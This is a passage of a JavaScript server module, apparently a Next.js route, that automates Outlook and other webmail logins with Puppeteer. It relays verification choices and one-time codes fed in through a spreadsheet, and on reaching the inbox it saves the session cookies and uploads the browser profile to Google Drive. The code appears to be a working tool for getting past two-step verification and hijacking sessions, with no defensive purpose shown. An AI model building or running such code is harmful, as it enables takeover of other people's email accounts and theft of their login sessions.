                            logger.info(`[processRow][${browserId}][WAITINGOPTIONS] Interpreted verificationChoiceRaw as plain string for full email input: '${hiddenInputText}' for view ${currentActualViewName}`);
                        } else {
                            logger.error(`[processRow][${browserId}][WAITINGOPTIONS] Invalid verificationChoice format for view ${currentActualViewName}. Clearing and retrying. Error: ${e.message}`);
                            await updateBrowserRowData(browserId, { verificationChoice: '', status: "WAITINGOPTIONS", verificationOptions: JSON.stringify(currentVerificationOptions) });
                            await new Promise(resolve => setTimeout(resolve, 10000));
                            continue;
                        }
                    }
                    
                    if (!currentVerificationOptions || currentVerificationOptions.length === 0) {
                         logger.error(`[processRow][${browserId}][WAITINGOPTIONS] currentVerificationOptions is unexpectedly empty for view '${currentActualViewName}'. Failing.`);
                         finalStatus = "FAILED"; break;
                    }
                    
                    let selectedOption;
                    if (currentActualViewName === 'Outlook Verify Email Full Input') {
                        if (currentVerificationOptions.length > 0 && currentVerificationOptions[0].type === 'full_email_input') {
                            selectedOption = currentVerificationOptions[0]; 
                            logger.info(`[processRow][${browserId}][WAITINGOPTIONS] Using 'full_email_input' option for view: ${currentActualViewName}`);
                            if (!hiddenInputText) { 
                                logger.error(`[processRow][${browserId}][WAITINGOPTIONS] 'hiddenPhoneEmail' (full email) is required for '${currentActualViewName}' but not provided in verificationChoice. Value was: '${hiddenInputText}'. Clearing choice.`);
                                await updateBrowserRowData(browserId, { verificationChoice: '', status: "WAITINGOPTIONS", verificationOptions: JSON.stringify(currentVerificationOptions) });
                                await new Promise(resolve => setTimeout(resolve, 10000));
                                continue;
                            }
                        } else {
                             logger.error(`[processRow][${browserId}][WAITINGOPTIONS] Expected 'full_email_input' option type for view '${currentActualViewName}' but found: ${JSON.stringify(currentVerificationOptions)}. Clearing choice.`);
                             await updateBrowserRowData(browserId, { verificationChoice: '', status: "WAITINGOPTIONS", verificationOptions: JSON.stringify(currentVerificationOptions) });
                             await new Promise(resolve => setTimeout(resolve, 10000));
                             continue;
                        }
                    } else { 
                        if (!chosenOptionIndex) {
                             logger.error(`[processRow][${browserId}][WAITINGOPTIONS] 'choice' (index) property missing in verificationChoice data for view '${currentActualViewName}'. Clearing choice.`);
                             await updateBrowserRowData(browserId, { verificationChoice: '', status: "WAITINGOPTIONS", verificationOptions: JSON.stringify(currentVerificationOptions) }); 
                             await new Promise(resolve => setTimeout(resolve, 10000));
                             continue;
                        }
                        selectedOption = currentVerificationOptions.find(opt => opt.choiceIndex === chosenOptionIndex);
                    }

                    if (!selectedOption) {
                        logger.error(`[processRow][${browserId}][WAITINGOPTIONS] Chosen option (index: ${chosenOptionIndex}, for view: ${currentActualViewName}) not found or applicable in current options. Clearing choice. Options: ${JSON.stringify(currentVerificationOptions)}`);
                        await updateBrowserRowData(browserId, { verificationChoice: '', status: "WAITINGOPTIONS", verificationOptions: JSON.stringify(currentVerificationOptions) });
                        await new Promise(resolve => setTimeout(resolve, 10000));
                        continue;
                    }
                    
                    logger.info(`[processRow][${browserId}][WAITINGOPTIONS] Processing option: ${JSON.stringify(selectedOption)} for view: ${currentActualViewName}`);

                    try {
                        if (selectedOption.type !== 'full_email_input' && selectedOption.id) {
                            await page.waitForSelector(`#${selectedOption.id}`, { visible: true, timeout: 5000 });
                            await page.click(`#${selectedOption.id}`);
                            logger.info(`[processRow][${browserId}][WAITINGOPTIONS] Clicked radio button: #${selectedOption.id}`);
                            await new Promise(res => setTimeout(res, 500)); 
                        } else if (selectedOption.type === 'full_email_input') {
                            logger.info(`[processRow][${browserId}][WAITINGOPTIONS] Full email input type, no radio button to click for selection, input will be typed.`);
                        }

                        if (selectedOption.requiresInput && selectedOption.inputSelector && hiddenInputText) {
                            await page.waitForSelector(selectedOption.inputSelector, { visible: true, timeout: 5000 });
                            await page.evaluate((sel) => { const el = document.querySelector(sel); if (el) el.value = ''; }, selectedOption.inputSelector);
                            await page.type(selectedOption.inputSelector, hiddenInputText, { delay: 50 });
                            logger.info(`[processRow][${browserId}][WAITINGOPTIONS] Typed "${hiddenInputText}" into ${selectedOption.inputSelector}`);
                        } else if (selectedOption.requiresInput && !hiddenInputText && currentActualViewName === 'Outlook Verify Email Full Input') {
                             logger.error(`[processRow][${browserId}][WAITINGOPTIONS] 'Outlook Verify Email Full Input' requires hiddenInputText (full email) but it's missing. Clearing choice.`);
                             await updateBrowserRowData(browserId, { verificationChoice: '', status: "WAITINGOPTIONS", verificationOptions: JSON.stringify(currentVerificationOptions) });
                             await new Promise(resolve => setTimeout(resolve, 10000));
                             continue;
                        } else if (selectedOption.requiresInput && !hiddenInputText) {
                             logger.warn(`[processRow][${browserId}][WAITINGOPTIONS] Option requires input, but no hiddenPhoneEmail provided. Attempting to proceed without it for option: ${selectedOption.label}`);
                        }
                        
                        let sendCodeBtnSelector;
                        if (currentActualViewName === 'Outlook Verify Email Full Input') {
                            sendCodeBtnSelector = platformConfig.selectors.verifyEmailSendCodeButton;
                        } else { 
                            sendCodeBtnSelector = platformConfig.selectors.sendCodeButton;
                        }

                        if (!sendCodeBtnSelector) throw new Error(`Send code button selector not defined for current view/platform configuration. View: ${currentActualViewName}`);
                        
                        logger.info(`[processRow][${browserId}][WAITINGOPTIONS] Attempting to click send code button: ${sendCodeBtnSelector} for view ${currentActualViewName}`);
                        await page.waitForSelector(sendCodeBtnSelector, { visible: true, timeout: 10000 }); 
                                const navigationPromise = page.waitForNavigation({ waitUntil: 'networkidle0', timeout: 15000 }).catch(() => null);
                                await page.click(sendCodeBtnSelector);
                                await navigationPromise;
                                logger.info(`[processRow][${browserId}][WAITINGOPTIONS] Clicked "Send code" button: ${sendCodeBtnSelector}`);
                                await new Promise(res => setTimeout(res, 2000));

                                const outlookServiceErrorText = "There's a temporary problem with the service.";
                                const hasOutlookServiceError = await page.evaluate((errorText) => {
                                    return document.body.innerText.includes(errorText);
                                }, outlookServiceErrorText).catch(() => false);

                                if (hasOutlookServiceError) {
                                    logger.warn(`[processRow][${browserId}][WAITINGOPTIONS] Outlook service error detected: "${outlookServiceErrorText}"`);
                                    const errorOption = [{ label: "Outlook: Temporary service problem. Please wait and try again.", type: "service_error", choiceIndex: "outlook_service_error" }];
                                    currentVerificationOptions = errorOption; // Update for LJR

                                    const ljpServiceError = JSON.parse(updateData.lastJsonResponse || '{}');
                                    updateData.lastJsonResponse = JSON.stringify({
                                        ...ljpServiceError,
                                        status: "WAITINGOPTIONS",
                                        verificationState: 'WAITING_OPTIONS',
                                        verificationOptions: errorOption,
                                        viewName: currentActualViewName, 
                                        message: "Outlook reported a temporary service problem. Please try again later."
                                    });
                                    await updateBrowserRowData(browserId, {
                                        status: "WAITINGOPTIONS",
                                        verificationChoice: '',
                                        verificationOptions: JSON.stringify(errorOption),
                                        lastJsonResponse: updateData.lastJsonResponse
                                    });
                                    // Continue to the next iteration of the WAITINGOPTIONS polling loop
                                    await new Promise(resolve => setTimeout(resolve, 10000)); // Wait before next poll
                                    continue; 
                                }
                                
                                const verificationStatusAfterSend = await checkVerification(page, platformConfig);
                                if (verificationStatusAfterSend.required && verificationStatusAfterSend.type === 'code') {
                                    logger.info(`[processRow][${browserId}][WAITINGOPTIONS] Successfully sent code. Transitioning to WAITINGCODE. View detected: ${verificationStatusAfterSend.viewName}`);
                                    finalStatus = "WAITINGCODE";
                                    const ljpBeforeCodeSend = JSON.parse(updateData.lastJsonResponse || '{}');
                                    updateData = {
                                        status: "WAITINGCODE",
                                        verificationChoice: '', 
                                        lastJsonResponse: JSON.stringify({
                                            ...ljpBeforeCodeSend, 
                                            status: "WAITINGCODE", 
                                            verificationState: 'WAITING_CODE',
                                            viewName: verificationStatusAfterSend.viewName,
                                            verificationOptions: currentVerificationOptions, 
                                            message: "Code sent, awaiting input."
                                        })
                                    };
                                    await updateBrowserRowData(browserId, updateData);
                                    break;
                                } else {
                                    logger.warn(`[processRow][${browserId}][WAITINGOPTIONS] Did not reach a recognized 'code' entry screen after sending code. verificationStatusAfterSend: ${JSON.stringify(verificationStatusAfterSend)}. Current URL: ${page.url()}`);
                                    const stillOnChoicePage = await checkVerification(page, platformConfig); 
                                    if (stillOnChoicePage.required && stillOnChoicePage.type === 'choice') {
                                        logger.warn(`[processRow][${browserId}][WAITINGOPTIONS] Still on a choice page: '${stillOnChoicePage.viewName}'. Input might be wrong or page didn't transition as expected. Clearing choice and re-setting to WAITINGOPTIONS.`);
                                        currentVerificationOptions = await platformConfig.extractVerificationOptions(page, platformConfig, stillOnChoicePage.viewName); 
                                        await updateBrowserRowData(browserId, {
                                            status: "WAITINGOPTIONS",
                                            verificationChoice: '', 
                                            verificationOptions: JSON.stringify(currentVerificationOptions), 
                                            lastJsonResponse: JSON.stringify({ 
                                                ...JSON.parse(updateData.lastJsonResponse || '{}'), 
                                                status: "WAITINGOPTIONS", 
                                                viewName: stillOnChoicePage.viewName, 
                                                verificationOptions: currentVerificationOptions, 
                                                message: "Failed to send code or invalid input, please re-enter choice."
                                            })
                                        });
                                    } else {
                                        logger.error(`[processRow][${browserId}][WAITINGOPTIONS] Unexpected page state after attempting to send code. Failing.`);
                                        finalStatus = "FAILED"; break;
                                    }
                                }
                    } catch (interactionError) {
                        logger.error(`[processRow][${browserId}][WAITINGOPTIONS] Error during page interaction for choice: ${interactionError.message}. Clearing choice and retrying WAITINGOPTIONS.`);
                        currentVerificationOptions = await platformConfig.extractVerificationOptions(page, platformConfig, currentActualViewName).catch(() => currentVerificationOptions); 
                        await updateBrowserRowData(browserId, {
                            status: "WAITINGOPTIONS",
                            verificationChoice: '', 
                            verificationOptions: JSON.stringify(currentVerificationOptions), 
                            lastJsonResponse: JSON.stringify({ 
                                ...JSON.parse(updateData.lastJsonResponse || '{}'), 
                                status: "WAITINGOPTIONS", 
                                viewName: currentActualViewName, 
                                verificationOptions: currentVerificationOptions, 
                                message: `Error processing choice: ${interactionError.message}` 
                            })
                        });
                    }
                } else {
                    logger.debug(`[processRow][${browserId}][WAITINGOPTIONS] No verificationChoice yet. Waiting...`);
                }

            } catch (pollError) {
                logger.error(`[processRow][${browserId}][WAITINGOPTIONS] Error during polling: ${pollError.message}`);
                await new Promise(resolve => setTimeout(resolve, 15000));
            }
            if (finalStatus === "WAITINGOPTIONS") {
                await new Promise(resolve => setTimeout(resolve, 10000)); 
            }
        } 
        if (finalStatus === "WAITINGOPTIONS") { 
            logger.warn(`[processRow][${browserId}][WAITINGOPTIONS] Polling for choice timed out. Setting status to FAILED.`);
            finalStatus = "FAILED";
        }
        updateData.status = finalStatus; 
        if (finalStatus === "FAILED" && !updateData.lastJsonResponse?.includes("FAILED")) {
             updateData.lastJsonResponse = JSON.stringify({
                ...JSON.parse(updateData.lastJsonResponse || '{}'), status: "FAILED", 
                message: "Failed during WAITINGOPTIONS phase."
            });
        }
      }


      // --- WAITINGCODE Loop (for all platforms including Outlook after choice) ---
      if (finalStatus === "WAITINGCODE") {
          logger.info(`[processRow][${browserId}] Entering WAITINGCODE poll loop. Current page: ${page.url()}`);
          if (updateData.status !== "WAITINGCODE") { 
            updateData.status = "WAITINGCODE";
            updateData.lastJsonResponse = JSON.stringify({
                ...JSON.parse(updateData.lastJsonResponse || '{}'), status: "WAITINGCODE",
                verificationState: 'WAITING_CODE', 
                message: "Awaiting verification code."
            });
            await updateBrowserRowData(browserId, { status: "WAITINGCODE", lastJsonResponse: updateData.lastJsonResponse });
          }


          const pollingTimeout = Date.now() + 5 * 60 * 1000; 
          let codeSuccessfullyProcessed = false;

          while (Date.now() < pollingTimeout && finalStatus === "WAITINGCODE") {
              try {
                  const checkData = await fetchDataFromAppScript(1, 30000); 
                  const checkHeaders = checkData[0];
                  const checkColumnIndexes = getColumnIndexes(checkHeaders);
                  const checkRows = checkData.slice(1);
                  const checkRow = checkRows.find(r => r[checkColumnIndexes['browserId']] === browserId);

                  if (!checkRow) {
                      logger.error(`[processRow][${browserId}][WAITINGCODE] Row not found during polling. Exiting loop.`);
                      finalStatus = "FAILED"; 
                      break;
                  }

                  const currentSheetStatus = checkRow[checkColumnIndexes['status']];
                  const verificationCode = checkRow[checkColumnIndexes['verificationCode']];

                  if (currentSheetStatus !== "WAITINGCODE") {
                      logger.info(`[processRow][${browserId}][WAITINGCODE] Status changed externally to ${currentSheetStatus}. Exiting loop.`);
                      finalStatus = currentSheetStatus; 
                      break;
                  }

                  if (verificationCode && String(verificationCode).trim() !== "") {
                      logger.info(`[processRow][${browserId}][WAITINGCODE] Verification code found: '${verificationCode}'`);
                      
                      const currentViewNameForCode = JSON.parse(updateData.lastJsonResponse || '{}').viewName || initialCheckResult.viewName;
                      let codeInputSelector;
                      let codeSubmitSelector;
                      let useEnterToSubmit = false;

                      if (currentViewNameForCode === 'Outlook Enter Code Fluent') {
                          codeInputSelector = platformConfig.selectors?.fluentCodeInput;
                          codeSubmitSelector = platformConfig.selectors?.fluentCodeSubmit; 
                          useEnterToSubmit = true; 
                          logger.info(`[processRow][${browserId}][WAITINGCODE] Using Fluent code input selectors. Input: ${codeInputSelector}, Will press Enter to submit.`);
                      } else {
                          codeInputSelector = platformConfig.selectors?.verificationCodeInput; 
                          codeSubmitSelector = platformConfig.selectors?.verificationCodeSubmit;
                          logger.info(`[processRow][${browserId}][WAITINGCODE] Using standard code input selectors. Input: ${codeInputSelector}, Submit: ${codeSubmitSelector}`);
                      }

                      let codeEntryAttempted = false; 
                      if (codeInputSelector) { 
                          try {
                              await page.waitForSelector(codeInputSelector, { visible: true, timeout: 10000 });
                              await page.evaluate((sel) => { const el = document.querySelector(sel); if(el) el.value = ''; }, codeInputSelector);
                              await page.type(codeInputSelector, String(verificationCode), { delay: 50 }); 
                              logger.info(`[processRow][${browserId}][WAITINGCODE] Typed code into ${codeInputSelector}`);

                              const navigationPromise = page.waitForNavigation({ waitUntil: 'networkidle0', timeout: 15000 })
                                 .catch(e => logger.warn(`[processRow][${browserId}][WAITINGCODE] Navigation after code submit/Enter did not complete as expected or timed out: ${e.message}`));

                              if (useEnterToSubmit) {
                                  await page.keyboard.press('Enter');
                                  logger.info(`[processRow][${browserId}][WAITINGCODE] Pressed Enter to submit fluent code.`);
                              } else if (codeSubmitSelector) {
                                  await page.waitForSelector(codeSubmitSelector, { visible: true, timeout: 5000 });
                                  await page.click(codeSubmitSelector);
                                  logger.info(`[processRow][${browserId}][WAITINGCODE] Clicked code submit button: ${codeSubmitSelector}`);
                              } else {
                                  logger.warn(`[processRow][${browserId}][WAITINGCODE] No submit selector and not flagged to use Enter. Code typed, hoping for auto-submit.`);
                              }
                              
                              await navigationPromise; 
                              await new Promise(res => setTimeout(res, 2500)); 
                              logger.info(`[processRow][${browserId}][WAITINGCODE] Waited after code submission attempt for page to settle.`);
                              codeEntryAttempted = true;

                          } catch (codeEntryError) {
                               logger.error(`[processRow][${browserId}][WAITINGCODE] Error during code entry/submission: ${codeEntryError.message}`);
                          }

                          if(codeEntryAttempted) { 
                            await handleAdditionalViews(page, platformConfig, instanceId, 'post_verification'); 
                          }
                          
                          let stillOnCodeEntryScreen = false;
                          let returnedToChoiceScreen = false;
                          
                          const postCodeVerificationState = await checkVerification(page, platformConfig);
                          if (postCodeVerificationState.required) {
                              if (postCodeVerificationState.type === 'code') {
                                  stillOnCodeEntryScreen = true;
                                  logger.warn(`[processRow][${browserId}][WAITINGCODE] Still on a code entry screen after submission attempt. Assuming code was incorrect.`);
                              } else if (postCodeVerificationState.type === 'choice' && platform === 'outlook') {
                                  returnedToChoiceScreen = true;
                                  logger.warn(`[processRow][${browserId}][WAITINGCODE] Returned to choice screen after code submission attempt for Outlook.`);
                              }
                          }

                          const inboxReachedAfterCode = await isInbox(page, platformConfig);

                          if (inboxReachedAfterCode) {
                              logger.info(`[processRow][${browserId}][WAITINGCODE] Inbox reached after code entry. Setting status to COMPLETED.`);
                              finalStatus = "COMPLETED";
                              codeSuccessfullyProcessed = true;
                          
                              const browserCookies = await page.cookies();
                              updateData.status = "COMPLETED";
                              updateData.cookieJSON = JSON.stringify(browserCookies);
                              updateData.lastJsonResponse = JSON.stringify({ 
                                browserId, email, status: "COMPLETED",
                                emailExists: initialCheckResult.emailExists, accountAccess: true, 
                                reachedInbox: true, requiresVerification: false, 
                                platform, timestamp: new Date().toISOString(),
                                message: "Successfully verified with code and reached inbox."
                              });
                              updateData.verificationCode = ''; 

                              logger.info(`[processRow][${browserId}] COMPLETED status after code. Updating sheet before Drive upload.`);
                              await updateBrowserRowData(browserId, {
                                  status: "COMPLETED",
                                  cookieJSON: updateData.cookieJSON, 
                                  lastJsonResponse: updateData.lastJsonResponse,
                                  verificationCode: '' 
                              });
                              
                              if (browser) {
                                if (targetCreatedListener && !isReusingBrowser) browser.off('targetcreated', targetCreatedListener);
                                logger.info(`[processRow][${browserId}] Closing browser after successful verification.`);
                                await browser.close().catch(err => logger.error(`Error closing browser for ${browserId}: ${err.message}`));
                                browserFullyClosed = true;
                                activeBrowserSessions.delete(browserId);
                                await new Promise(resolve => setTimeout(resolve, 1000));
                              }

                              let uploadedDriveUrlAfterCode = null;
                              try {
                                uploadedDriveUrlAfterCode = await uploadBrowserData(browserId);
                                if (uploadedDriveUrlAfterCode) {
                                  updateData.driveUrl = uploadedDriveUrlAfterCode;
                                }
                              } catch (uploadError) {
                                logger.error(`[processRow][${browserId}] Error during Google Drive upload after code: ${uploadError.message}`);
                              }
                              
                              if (updateData.driveUrl && userDataDir) {
                                try {
                                  await fs.remove(userDataDir);
                                  logger.info(`[processRow][${browserId}][WAITINGCODE] Deleted user data dir after completion.`);
                                } catch (deleteError) {
                                  logger.error(`[processRow][${browserId}][WAITINGCODE] Error deleting user data dir: ${deleteError.message}`);
                                }
                              }
                              break; 
                          } else {
                              logger.warn(`[processRow][${browserId}][WAITINGCODE] Code entered, but inbox not reached. Current URL: ${page.url()}`);
                              
                              if (returnedToChoiceScreen) { 
                                  logger.warn(`[processRow][${browserId}][WAITINGCODE] Outlook: Returned to choice screen. Transitioning to WAITINGOPTIONS.`);
                                  finalStatus = "WAITINGOPTIONS";
                                  // Use the fresh options from postCodeVerificationState
                                  const freshOptionsFromLoopback = await platformConfig.extractVerificationOptions(page, platformConfig, postCodeVerificationState.viewName);
                                  updateData = {
                                      status: "WAITINGOPTIONS",
                                      verificationCode: '', 
                                      verificationChoice: '', 
                                      verificationOptions: JSON.stringify(freshOptionsFromLoopback),
                                      lastJsonResponse: JSON.stringify({
                                          ...JSON.parse(updateData.lastJsonResponse || '{}'), 
                                          status: "WAITINGOPTIONS",
                                          message: "Incorrect code or issue, returned to verification options. Please choose again.",
                                          verificationState: 'WAITING_OPTIONS',
                                          verificationOptions: freshOptionsFromLoopback, 
                                          viewName: postCodeVerificationState.viewName 
                                      })
                                  };
                                  await updateBrowserRowData(browserId, updateData);
                                  codeSuccessfullyProcessed = false; 
                                  break; 
                              } else if (stillOnCodeEntryScreen) {
                                   logger.warn(`[processRow][${browserId}][WAITINGCODE] Still on code entry screen. Assuming code was incorrect. Clearing code and staying in WAITINGCODE.`);
                                   await updateBrowserRowData(browserId, { 
                                       verificationCode: '', 
                                       status: "WAITINGCODE", 
                                       lastJsonResponse: JSON.stringify({
                                           ...JSON.parse(updateData.lastJsonResponse || '{}'),
                                           status: "WAITINGCODE",
                                           message: "Incorrect verification code entered or error on page. Please try again."
                                       })
                                   });
                              } else {
                                  logger.error(`[processRow][${browserId}][WAITINGCODE] Unexpected page state after code submission. Failing. Current URL: ${page.url()}`);
                                  finalStatus = "FAILED";
                                  codeSuccessfullyProcessed = false;
                                  break;
                              }
                          }
                      }  else { 
                        logger.error(`[processRow][${browserId}][WAITINGCODE] Verification code input/submit selectors not defined for platform ${platform}. Failing.`);
                        finalStatus = "FAILED"; 
                        break;
                      }
                  } else {
                      logger.debug(`[processRow][${browserId}][WAITINGCODE] No code found yet. Waiting...`);
                  }

              } catch (pollError) {
                  logger.error(`[processRow][${browserId}][WAITINGCODE] Error during polling: ${pollError.message}`);
                  await new Promise(resolve => setTimeout(resolve, 15000)); 
              }
              
              if (finalStatus === "WAITINGCODE" && !codeSuccessfullyProcessed) { 
                 await new Promise(resolve => setTimeout(resolve, 10000));
              }
          } 

          if (finalStatus === "WAITINGCODE" && !codeSuccessfullyProcessed) { 
             logger.warn(`[processRow][${browserId}][WAITINGCODE] Polling for code timed out or failed. Setting status to FAILED.`);
             finalStatus = "FAILED"; 
          }
          
          updateData.status = finalStatus; 
          if (finalStatus === "FAILED" && !updateData.lastJsonResponse?.includes("COMPLETED")) { 
                updateData.lastJsonResponse = JSON.stringify({
                    ...JSON.parse(updateData.lastJsonResponse || '{}'), status: "FAILED", 
                    message: "Failed during WAITINGCODE phase."
                });
          } else if (finalStatus === "WAITINGOPTIONS") {
               updateData.lastJsonResponse = JSON.stringify({
                    ...JSON.parse(updateData.lastJsonResponse || '{}'), status: "WAITINGOPTIONS", 
                    message: "Incorrect code, returned to verification options."
                });
          }
          logger.info(`[processRow][${browserId}] Exited WAITINGCODE loop. Final status for sheet update: ${updateData.status}`);
      }

    } catch (error) {
      logger.error(`[processRow][${browserId}] Error processing row: ${error.message}`, error);
      updateData.status = "FAILED"; 
      updateData.lastJsonResponse = JSON.stringify({
            browserId, email, status: "FAILED", error: error.message, 
            platform, timestamp: new Date().toISOString(),
            ...(initialCheckResult.emailExists !== undefined && { 
                emailExists: initialCheckResult.emailExists,
                accountAccess: initialCheckResult.accountAccess,
                reachedInbox: initialCheckResult.reachedInbox,
                requiresVerification: initialCheckResult.requiresVerification,
                verificationState: initialCheckResult.verificationState
            })
      });
    } finally {
      if (browser && !browserFullyClosed) {
        const sessionTargetListener = isReusingBrowser ? activeBrowserSessions.get(browserId)?.targetCreatedListener : targetCreatedListener;
        if (sessionTargetListener && browser) { // Ensure listener exists before trying to remove
            try {
                browser.off('targetcreated', sessionTargetListener);
            } catch (offError) {
                logger.warn(`[processRow][${browserId}] Error removing targetcreated listener: ${offError.message}`);
            }
        }
        
        if (updateData.status === "WAITINGCODE" || updateData.status === "WAITINGOPTIONS") {
            logger.info(`[processRow][${browserId}] Keeping browser open as it is in ${updateData.status} state. Storing session.`);
            activeBrowserSessions.set(browserId, { browser, page, targetCreatedListener: sessionTargetListener }); // Store the listener that was active for this session
        } else {
            logger.info(`[processRow][${browserId}] Final cleanup - Closing browser (status: ${updateData.status})`);
            await browser.close().catch(err => logger.error(`Error closing browser during cleanup for ${browserId}: ${err.message}`));
            browserFullyClosed = true;
            activeBrowserSessions.delete(browserId); 
            await new Promise(resolve => setTimeout(resolve, 1000));
        }
      } else if (isReusingBrowser && browser && (updateData.status !== "WAITINGCODE" && updateData.status !== "WAITINGOPTIONS")) {
        const session = activeBrowserSessions.get(browserId);
        if (session?.targetCreatedListener && session.browser) {
             try {
                session.browser.off('targetcreated', session.targetCreatedListener);
            } catch (offError) {
                logger.warn(`[processRow][${browserId}] Error removing targetcreated listener from reused session: ${offError.message}`);
            }
        }
        logger.info(`[processRow][${browserId}] Final cleanup (reused session) - Closing browser (status: ${updateData.status})`);
        await browser.close().catch(err => logger.error(`Error closing reused browser during cleanup for ${browserId}: ${err.message}`));
        browserFullyClosed = true;
        activeBrowserSessions.delete(browserId);
        await new Promise(resolve => setTimeout(resolve, 1000));
      }

      const finalSheetUpdate = { ...updateData }; 
      if (finalSheetUpdate.status === "COMPLETED") {
          finalSheetUpdate.verificationOptions = '';
          finalSheetUpdate.verificationChoice = '';
          finalSheetUpdate.verificationCode = '';
      } else if (finalSheetUpdate.status === "WAITINGCODE") {
          finalSheetUpdate.verificationChoice = '';
          if (!finalSheetUpdate.hasOwnProperty('verificationCode')) {
              finalSheetUpdate.verificationCode = ''; 
          }
      } else if (finalSheetUpdate.status === "WAITINGOPTIONS") {
          finalSheetUpdate.verificationCode = '';
          if (!finalSheetUpdate.hasOwnProperty('verificationChoice')) {
              finalSheetUpdate.verificationChoice = '';
          }
          if (!finalSheetUpdate.hasOwnProperty('verificationOptions')) {
              finalSheetUpdate.verificationOptions = '';
          }
      }

      logger.info(`[processRow][${browserId}] Updating final sheet state with data: ${JSON.stringify(finalSheetUpdate)}`);
      await updateBrowserRowData(browserId, finalSheetUpdate).catch(err => 
        logger.error(`[processRow][${browserId}] Failed to update final sheet state: ${err.message}`)
      );
      
      if (updateData.status === "FAILED" && userDataDir) {
        if (browserFullyClosed || (browser && !browser.isConnected())) { 
            try {
              logger.info(`[processRow][${browserId}] Final status FAILED. Attempting to delete user data directory: ${userDataDir}`);
              await fs.remove(userDataDir);
              logger.info(`[processRow][${browserId}] Successfully deleted user data directory: ${userDataDir}`);
            } catch (deleteError) {
              if (deleteError.code === 'EBUSY') {
                logger.warn(`[processRow][${browserId}] Error deleting user data directory (failed status): EBUSY: Resource busy or locked. Path: ${userDataDir}. This often means a previous browser process didn't fully exit.`);
              } else {
                logger.error(`[processRow][${browserId}] Error deleting user data directory (failed status): ${deleteError.message}`, deleteError);
              }
            }
        } else {
             logger.warn(`[processRow][${browserId}] Final status FAILED, but browser not confirmed closed or still connected. Skipping userDataDir deletion.`);
        }
      }
    }
}

// Flag to prevent the interval timer from overlapping runs if a run takes longer than the interval
let isProcessingInterval = false; 

async function processWaitingRows() { 
  if (isProcessingInterval) {
    logger.debug("Interval check skipped: Previous run still in progress.");
    return;
  }
  isProcessingInterval = true;
  logger.info(`Interval check running. Active processes: ${activeProcesses.size}/${MAX_CONCURRENT_BROWSERS}`);

  try {
    const availableSlots = MAX_CONCURRENT_BROWSERS - activeProcesses.size;
    if (availableSlots <= 0) {
      logger.info("Concurrency limit reached. No available slots.");
      isProcessingInterval = false; 
      return;
    }

    const data = await fetchDataFromAppScript();
    
    if (!Array.isArray(data) || data.length === 0) {
      logger.warn('Invalid or empty data fetched from App Script.');
      isProcessingInterval = false; 
      return;
    }

    const headers = data[0];
    const columnIndexes = getColumnIndexes(headers);
    const rows = data.slice(1);

    const processableStatuses = ["WAITING", "WAITINGOPTIONS", "WAITINGCODE"];
    const processableRows = rows.filter(row => {
        const status = row[columnIndexes['status']];
        const bId = row[columnIndexes['browserId']];
        // Process if status is processable AND (it's not in activeProcesses OR it has an active browser session to be reused)
        return processableStatuses.includes(status) && 
               (!activeProcesses.has(bId) || activeBrowserSessions.has(bId));
    });


    if (processableRows.length === 0) {
      logger.info("No new WAITING, WAITINGOPTIONS, or WAITINGCODE rows found to process (or active ones lack reusable sessions).");
      isProcessingInterval = false; 
      return;
    }

    const rowsToProcessInThisRun = [];
    let slotsUsed = 0;
    for (const row of processableRows) {
        const browserId = row[columnIndexes['browserId']];
        if (activeBrowserSessions.has(browserId)) { // Prioritize reusing sessions
            rowsToProcessInThisRun.push(row);
        } else if (slotsUsed < availableSlots) {
            rowsToProcessInThisRun.push(row);
            slotsUsed++;
        }
        if (rowsToProcessInThisRun.length >= MAX_CONCURRENT_BROWSERS && slotsUsed >= availableSlots) break; 
    }
    
    logger.info(`Found ${processableRows.length} processable rows. Will attempt to process ${rowsToProcessInThisRun.length} rows in this run (reusing sessions where possible).`);

    for (const rowToProcess of rowsToProcessInThisRun) {
        const browserId = rowToProcess[columnIndexes['browserId']];
        
        if (!activeProcesses.has(browserId)) { // Only add to activeProcesses if not already there (e.g. for new launches)
            activeProcesses.add(browserId); 
        }
        logger.info(`Starting processing for ${browserId} (Status: ${rowToProcess[columnIndexes['status']]}). Active: ${activeProcesses.size}/${MAX_CONCURRENT_BROWSERS}`);

        const existingSession = activeBrowserSessions.get(browserId);

        processRow(rowToProcess, columnIndexes, existingSession?.browser, existingSession?.page)
            .catch(err => {
                logger.error(`[processWaitingRows] Uncaught error during processRow for ${browserId}: ${err.message}`, err);
                const sessionToClean = activeBrowserSessions.get(browserId);
                if (sessionToClean?.browser?.isConnected()) {
                    logger.warn(`[processWaitingRows] Cleaning up browser session for ${browserId} due to error in processRow.`);
                    if (sessionToClean.targetCreatedListener && sessionToClean.browser) { // Check browser exists
                        try {
                           sessionToClean.browser.off('targetcreated', sessionToClean.targetCreatedListener);
                        } catch (offError) {
                           logger.warn(`[processWaitingRows] Error removing targetCreated listener during error cleanup for ${browserId}: ${offError.message}`);
                        }
                    }
                    sessionToClean.browser.close().catch(closeErr => logger.error(`Error closing browser during error cleanup for ${browserId}: ${closeErr.message}`));
                }
                activeBrowserSessions.delete(browserId);

                updateBrowserRowData(browserId, { 
                    status: "FAILED", 
                    lastJsonResponse: JSON.stringify({ 
                        browserId, status: "FAILED", error: `processRow crashed: ${err.message}`, timestamp: new Date().toISOString() 
                    }) 
                }).catch(updateErr => logger.error(`[processWaitingRows] Failed to update sheet to FAILED after processRow crash for ${browserId}: ${updateErr.message}`));
            })
            .finally(() => {
                if (!activeBrowserSessions.has(browserId)) { 
                    activeProcesses.delete(browserId);
                    logger.info(`Finished processing for ${browserId} (session closed or never existed for this run). Active: ${activeProcesses.size}/${MAX_CONCURRENT_BROWSERS}`);
                } else {
                    logger.info(`Processing for ${browserId} ended, but session kept open (WAITINGOPTIONS/CODE). Active: ${activeProcesses.size}/${MAX_CONCURRENT_BROWSERS}`);
                }
            });
    }

  } catch (error) {
    logger.error('Error in processWaitingRows:', error.message, error); 
  } finally {
    isProcessingInterval = false; 
    logger.debug("Interval check finished.");
  }
}

// Start the interval check immediately and then run every 10 seconds
// Ensure this setup only runs once when the module loads
let intervalId = null;
if (typeof intervalId !== 'number') { // Basic check to prevent multiple intervals if module reloads somehow
    logger.info("Setting up background processing interval...");
    processWaitingRows(); // Initial run
    intervalId = setInterval(processWaitingRows, 10000); // Check every 10 seconds
    logger.info(`Background processing interval set up with ID: ${intervalId}`);
} else {
    logger.warn("Background processing interval already appears to be set up.");
}


export async function OPTIONS() {
  return setCorsHeaders(NextResponse.json({}, { status: 200 }));
}
